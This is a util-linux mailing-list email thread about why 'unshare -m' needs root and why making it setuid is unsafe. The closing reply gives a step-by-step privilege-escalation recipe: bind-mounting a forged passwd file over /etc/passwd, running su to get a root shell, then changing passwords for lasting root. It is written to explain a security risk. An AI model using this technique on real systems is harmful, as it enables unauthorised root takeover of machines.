Return-Path: util-linux-owner@vger.kernel.org
Received: from mail-pa0-f52.google.com ([209.85.220.52]:34167 "EHLO
	mail-pa0-f52.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1751401AbbKNSRV (ORCPT
	<rfc822;util-linux@vger.kernel.org>); Sat, 14 Nov 2015 13:17:21 -0500
Received: by padhx2 with SMTP id hx2so131701095pad.1
        for <util-linux@vger.kernel.org>; Sat, 14 Nov 2015 10:17:21 -0800 (PST)
Date: Sat, 14 Nov 2015 10:17:16 -0800
From: Isaac Dunham <ibid.ag@gmail.com>
To: "U.Mutlu" <for-gmane@mutluit.com>
Cc: util-linux@vger.kernel.org
Subject: Re: unshare -m for non-root user
Message-ID: <20151114181716.GA3839@newbook>
References: <n0ujgc$tll$1@ger.gmane.org>
 <20151030102247.GF19508@ws.net.home>
 <n2674p$ulm$1@ger.gmane.org>
 <87si49p771.fsf@x220.int.ebiederm.org>
 <n26nkm$13l$1@ger.gmane.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
In-Reply-To: <n26nkm$13l$1@ger.gmane.org>
Sender: util-linux-owner@vger.kernel.org
List-ID: <util-linux.vger.kernel.org>

On Sat, Nov 14, 2015 at 08:25:10AM +0100, U.Mutlu wrote:
> Eric W. Biederman wrote on 11/14/2015 04:53 AM:
> >"U.Mutlu" <for-gmane@mutluit.com> writes:
> >
> >>Karel Zak wrote on 10/30/2015 11:22 AM:
> >>>On Fri, Oct 30, 2015 at 03:09:15AM +0100, U.Mutlu wrote:
> >>>>Hi,
> >>>>I wonder why "unshare -m" doesn't work for an unpriviledged user:
> >>>>
> >>>>$ unshare -m /bin/bash
> >>>>unshare: unshare failed: Operation not permitted
> >>>>$ echo $?
> >>>>1
> >>>>$ ls -l `which unshare`
> >>>>-rwxr-xr-x 1 root root 14640 Mar 30  2015 /usr/bin/unshare
> >>>>
> >>>>Funny thing: when making the binary setuid then it works.
> >>>>But I would prefer a working original version in the OS repository.
> >>>>
> >>>>OS: Debian 8
> >>>>
> >>>># dpkg -l | grep -i util-linux
> >>>>ii  util-linux                                 2.25.2-6            amd64
> >>>>Miscellaneous system utilities
> >>>>
> >>>>Is this a bug, or is it not supposed to work for non-root users?
> >>>
> >>>man 2 unshare:
> >>>
> >>>CLONE_NEWNS
> >>>
> >>>This  flag has the same effect as the clone(2) CLONE_NEWNS flag.
> >>>Unshare the mount namespace, so that the calling process has a private
> >>>copy of its namespace which is not shared with any other process.
> >>>Specifying this flag automatically implies CLONE_FS as well.  Use of
> >>>CLONE_NEWNS requires the CAP_SYS_ADMIN capability.
> >>>                           ^^^^^^^^^^^^
> >>>
> >>>.. so yes, it's expected behavior.
> >>>
> >>>      Karel
> >>
> >>I would say that the bug lies in the wrong file permissions.
> >>chmod u+s fixes the bug, and I suggest that this should be the default.
> >>Then non-root users can use it too.
> >
> >There is no bug.  There are real dangers in creating a new mount
> >namespace as you can fool suid root applications like passwd.
> 
> Any links to further info on that?
 
To get a root shell, if you can run 'mount':

Create a new file 'fakepasswd' containing this line (remove any newlines
and spaces):
root:$6$cKRXgPQf2npI1kN5$OaKLtkxZuEHgblQAV8s8ynmGfwV6w1GvdKPXVU1ZOVRk/dy4DO5pYv6CeBj4/Lr2KExSkXribZ4rerTVACQgi/:0:0:root:/root:/bin/ash

Overmount /etc/passwd with that file:
mount -o bind fakepasswd /etc/passwd

Run 'su'.
Press enter.

And you're root.
Then you can unmount /etc/passwd and change all passwords so you have
permanent root.

There are methods that you could use to make that particular example fail,
but there are too many ways to do that sort of trick...

HTH,
Isaac Dunham
